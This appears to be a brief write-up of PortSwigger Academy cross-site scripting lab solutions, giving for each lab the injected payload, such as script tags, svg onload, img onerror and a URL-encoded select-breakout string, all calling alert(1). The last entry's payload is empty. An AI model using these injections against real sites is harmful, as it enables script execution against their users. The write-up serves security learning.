# XSS 
- Author: [Mateusz Głuchowski](https://github.com/hue1337)
- Site: [PortSwigger Academy](https://portswigger.net)

## Lab: Reflected XSS into HTML context with nothing encoded

1. Payload:
    ```html
    <script>alert(1);</script>
    ```

## Lab: Stored XSS into HTML context with nothing encoded

1. Payload:
    ```html
    </p><script>alert(1);</script>
    ```

## Lab: DOM XSS in document.write sink using source `location.search`:

1. Payload:
    ```html
    "><svg onload=alert(1)>
    ```

## Lab: DOM XSS in innerHTML sink using source location.search
1. Payload:
    ```html
    </span><svg onload=alert(1)>

    or 

    <img src=1 onerror=alert(1)>
    ```

## Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

1. Payload:

    ```html
    '"><script>alert(1);</script>
    ```

## Lab: DOM XSS in document.write sink using source location.search inside a select element

1. Payload:
    ```html
    productId=2&storeId=%22%3e%3c%2foption%3e%3c%2fselect%3e%3cimg%20src%3d1%20onerror%3dalert(1)%3e
    ```

## Lab: DOM XSS in jQuery selector sink using a hashchange event

1. Payload: 
    ```html
    
    ```